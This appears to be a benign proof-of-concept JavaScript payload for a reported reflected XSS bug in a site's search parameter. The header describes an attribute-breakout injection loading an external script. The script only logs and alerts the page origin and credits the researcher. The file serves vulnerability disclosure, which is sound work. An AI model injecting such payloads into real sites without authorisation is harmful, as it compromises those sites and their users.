/*
 * Reflected XSS - Proof of Concept (benign)
 * Target : Search parameter ?s=
 * Type   : Reflected XSS via attribute breakout + external script
 * Author : Mayank Rajput
 * Note   : Demonstrates arbitrary JS execution in site's origin only.
 *          Accesses no data, no cookies, no other users. Research use.
 */
(function () {
  var origin = document.domain;
  console.log('[XSS PoC] JavaScript executed in origin: ' + origin + ' — Finder: Mayank Rajput Aka hackelite01');
  alert('XSS PoC\nJavaScript executes in origin: ' + origin + '\nReporter: Mayank Rajput Aka hackelite01');
})();
